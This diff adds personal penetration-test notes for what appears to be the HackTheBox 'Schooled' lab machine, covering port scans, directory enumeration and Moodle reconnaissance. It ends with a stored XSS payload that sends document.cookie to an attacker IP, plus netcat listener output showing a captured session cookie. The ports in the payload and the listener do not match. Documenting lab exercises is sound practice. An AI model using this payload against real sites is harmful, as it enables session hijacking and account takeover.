@@ -1,0 +1,65 @@
+P:
+
+Port 22: OpenSSH 7.9
+
+Port 80: Apache httpd 2.4.46
+
+Port 3060: mysqlx(?) 
+
+WEBPAGE:
+Teachers:
+Jane Higgins
+Lianne Carter
+Manuel Phillips
+Jamie Borham
+
+Customers:
+James Fernando
+
+Emails:
+admissions@schooled.htb
+
+"All content delivered over Moodle"
+
+GOBUSTER:
+big.txt:
+/.htaccess (Status: 403)
+/.htpasswd (Status: 403)
+/css (Status: 301)
+/fonts (Status: 301)
+/images (Status: 301)
+/js (Status: 301)
+
+
+Moodle.schooled.htb:
+Login page present
+Some courses may allow guest access
+Coookies must be enabled - attack vector?
+Forgotten password: Can seach by username and email
+Can create new account
+        cyberswell:Schooled1!:cyberswell@student.schooled.htb
+EMAIL FORMATS:
+Students: LAST_FIRST89@student.schooled.htb
+Staff: LAST_FIRST@staff.schooled.htb
+
+
+Mathematics:
+	Can self-enroll!
+        Announcement: "Reminder for joining students" - MoodleNet Profile?
+        Matthew Allen:allen_matthew89@student.schooled.htb
+        Oliver Bell:bell_oliver89@student.schooled.htb
+
+Potential XSS with MoodleNet profile field:
+<img src=x onerror=this.src='http://10.10.14.9:4444/?c='+document.cookie>
+nc -lnvp 1337
+listening on [any] 1337 ...
+Connect to [10.10.14.9] from (UNKNOWN) [10.10.10.234] 25654
+GET /?c=%22MoodleSession=b9hfbfb4uvikiceludiab0u5qq HTTP/1.1
+Host: 10.10.14.9:1337
+User-Agent: Mozilla/5.0 (X11; FreeBSD amd64; rv:86.0) Gecko/20100101 Firefox/86.0
+Accept: image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: keep-alive
+Referer: http://moodle.schooled.htb/moodle/user/profile.php?id=30
+
